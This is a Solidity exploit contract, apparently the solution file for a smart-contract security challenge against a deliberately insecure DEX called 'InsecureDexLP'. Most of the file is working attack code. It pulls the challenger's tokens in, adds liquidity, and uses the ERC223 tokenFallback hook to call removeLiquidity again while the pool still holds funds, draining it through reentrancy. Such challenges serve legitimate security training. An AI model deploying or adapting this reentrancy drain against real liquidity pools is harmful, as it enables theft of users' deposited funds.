// SPDX-License-Identifier: UNLICENSED
pragma solidity 0.8.14;

/*
 * Complete the contract below so that you can solve the challenge!
 * Note that you can (and may!) also modify the `deployExploits.js` file
 * and add the necessary calls to your exploit contract within the
 * `resolution.js` file.
 *
 * For this challenge, we already completed a tiny part of the
 * exploit contract for you! :)
 *
 * Also, if you need to declare additional contracts as helpers,
 * feel free to do so!
 */

/*///////////////////////////////////////////////////////////////////
//                                                                 //
//                           DEPENDENCIES                          //
//                                                                 //
///////////////////////////////////////////////////////////////////*/

/*
 * To solve certain challenges, you will need some interfaces.
 * We kindly provide them below :)
 */

interface IERC20 {
    function approve(address spender, uint256 amount) external returns (bool);

    function balanceOf(address account) external view returns (uint256);

    function transfer(address to, uint256 amount) external returns (bool);

    function transferFrom(
        address from,
        address to,
        uint256 amount
    ) external returns (bool);
}

interface InsecureDexLP {
    function addLiquidity(uint256 amount0, uint256 amount1) external;

    function balanceOf(address user) external view returns (uint256);

    function removeLiquidity(uint256 amount)
        external
        returns (uint256 amount0, uint256 amount1);

    function swap(
        address tokenFrom,
        address tokenTo,
        uint256 amountIn
    ) external returns (uint256 amountOut);

    function token0() external returns (IERC20);

    function token1() external returns (IERC20);
}

/*///////////////////////////////////////////////////////////////////
//                                                                 //
//                        EXPLOIT CONTRACTS                        //
//                                                                 //
///////////////////////////////////////////////////////////////////*/

contract Exploit2 {
    /*
     * HINT:
     * You will most likely use these things here ;)
     */
    IERC20 public token0; // this is insecureumToken
    IERC20 public token1; // this is simpleERC223Token
    InsecureDexLP public dex;
    address private immutable challenger;
    bool private reenter;

    constructor(InsecureDexLP _dex, address _challenger) {
        dex = _dex;
        token0 = dex.token0();
        token1 = dex.token1();
        challenger = _challenger;
    }

    function start() external {
        token0.approve(address(dex), type(uint256).max);
        token1.approve(address(dex), type(uint256).max);
        token0.transferFrom(
            challenger,
            address(this),
            token0.balanceOf(challenger)
        );
        token1.transferFrom(
            challenger,
            address(this),
            token1.balanceOf(challenger)
        );
        dex.addLiquidity(
            token0.balanceOf(address(this)),
            token1.balanceOf(address(this))
        );
        // Start reentering DEX here
        reenter = true;
        dex.removeLiquidity(dex.balanceOf(address(this)));
    }

    function withdrawAll() external {
        token0.transfer(challenger, token0.balanceOf(address(this)));
        token1.transfer(challenger, token1.balanceOf(address(this)));
    }

    function tokenFallback(
        address,
        uint256,
        bytes memory
    ) external {
        // Reenter only when first call to removeLiquidity()
        if (reenter == false) {
            return;
        }
        // Reentrancy
        if (token0.balanceOf(address(dex)) > 0) {
            dex.removeLiquidity(dex.balanceOf(address(this)));
        }
    }
}
